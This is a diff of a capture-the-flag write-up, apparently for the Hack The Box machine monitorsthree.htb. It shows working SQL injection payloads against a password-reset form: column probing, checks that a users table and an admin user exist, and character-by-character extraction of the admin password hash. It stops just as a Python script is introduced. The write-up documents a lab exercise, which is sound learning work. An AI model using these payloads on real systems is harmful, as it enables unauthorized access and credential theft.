@@ -49,31 +49,57 @@ there is a login page in monitorsthree.htb/login.php, and when using forgot pass
 
 by submitting : `'order by 3--+` till it gives error, from error we can see that it uses mariadb
 or we can use:
-`ad'union select null,null,null,null,null,null,null,null,null from dual-- `
+
+```
+ad'union select null,null,null,null,null,null,null,null,null from dual--
+```
+
 when we query nine column it says successfully sent request code, so we should use nine column from now in our sql query.
 by submitting `'||(SELECT '' FROM table)||'` it gives error and querying using
-`'||(SELECT '' FROM users)||'` gives successful output
+
+```
+ad'||(SELECT '' FROM users)||'
+```
+
+It gives successful output
 
 ![NMAP](/static/writeups/monitors/5.png)
 
 now we know there is a table called users.
 To enumerate user, i first used username administrator
-`ad' ||((SELECT 'a' FROM users WHERE username='administrator')='a')||'`
+
+```
+ad' ||((SELECT 'a' FROM users WHERE username='administrator')='a')||'
+```
+
 this gives error: `Unable to process request, try again!`
 
 ![NMAP](/static/writeups/monitors/4.png)
 
-but as when we input admin: `ad' ||((SELECT 'a' FROM users WHERE username='admin')='a')||'`
+but as when we input admin:
+
+```
+ad' ||((SELECT 'a' FROM users WHERE username='admin')='a')||'
+```
+
 it outputs: `Successfully sent password reset request!`
 ![NMAP](/static/writeups/monitors/5.png)
 
 so, we know there is user called admin more clinically now.
 
-`ad' ||((SELECT 'a' FROM users WHERE username='admin' and length(password)=32)='a')||'`
-password length = 32
-`ad' ||(SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3'||'`
+```
+ad' ||((SELECT 'a' FROM users WHERE username='admin' and length(password)=32)='a')||'
+```
 
-`ad' ||(SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='1'||'`
+I found out password length is 32, now to enumerate password one by one character i am using below queries:
+
+```
+ad' ||(SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3'||'
+```
+
+```
+ad' ||(SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='1'||'
+```
 
 It is time consuming so i decided to do it with python script:
 
